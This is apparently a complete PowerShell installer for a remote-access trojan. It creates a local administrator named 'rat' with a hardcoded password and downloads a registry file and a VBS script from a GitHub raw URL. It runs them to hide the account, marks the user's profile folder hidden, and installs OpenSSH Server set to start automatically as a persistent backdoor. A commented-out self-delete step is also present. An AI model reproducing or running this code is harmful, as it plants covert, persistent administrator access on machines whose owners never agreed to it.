function random_text{
    
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})

}
# create's local admin
function Create-NewLocalAdmin {
    [CmdletBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )

    process {
        #  Create local user if it doesn't exist
        if (-not (Get-LocalUser -Name $NewLocalAdmin -ErrorAction SilentlyContinue)) {
            New-LocalUser -Name $NewLocalAdmin -Password $Password -FullName $NewLocalAdmin -Description "Temporary local admin"
            Write-Verbose "$NewLocalAdmin local user created"
        } else {
            Write-Verbose "$NewLocalAdmin already exists"
            Enable-LocalUser -Name $NewLocalAdmin
        }

        #  Add to Administrators group if not already
        if (-not (Get-LocalGroupMember -Group "Administrators" | Where-Object {$_.Name -eq $NewLocalAdmin})) {
            Add-LocalGroupMember -Group "Administrators" -Member $NewLocalAdmin
            Write-Verbose "$NewLocalAdmin added to Administrators group"
        } else {
            Write-Verbose "$NewLocalAdmin is already an administrator"
        }

        #  Initialize profile folder for SSH login
        $ProfilePath = "C:\Users\$NewLocalAdmin"
        if (-not (Test-Path $ProfilePath)) {
            # Copy default profile skeleton
            Copy-Item "C:\Users\Default" $ProfilePath -Recurse -Force
            Copy-Item "C:\Users\Default\NTUSER.DAT" "$ProfilePath\NTUSER.DAT" -Force

            # Fix ownership and permissions so SSH can access
            icacls $ProfilePath /setowner ${NewLocalAdmin} /T /C
            icacls $ProfilePath /grant ${NewLocalAdmin}:(OI)(CI)F /T /C

            Write-Verbose "Profile for $NewLocalAdmin initialized"
        } else {
            Write-Verbose "Profile for $NewLocalAdmin already exists"
        }
    }
}

# Example usage
$NewLocalAdmin = "rat"
$Password = ConvertTo-SecureString "Rat123" -AsPlainText -Force
Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password


#goto temp and make working directory
$wd = random_text
$path = "$env:temp/$wd"
$initial_dir = Get-Location


mkdir $path
cd $path

# registry to hide local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"

#visual bacic script to registor the registory
Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/calty.vbs -OutFile "calty.vbs"


##install the registry
./"wrev.reg"; ./"calty.vbs"

#Hide the Rat user in \Users
cd C:\Users
attrib +h +s +r rat


#cd $env:temp
#$directory_name = random_text
#mkdir $directory_name

## Variables
#$wd = random_text


#$path = "$env:temp/$wd"
#$initial_dir = Get-Location


#enabling persistant ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# 



# self delete
#cd $initial_dir
#del Installer.ps1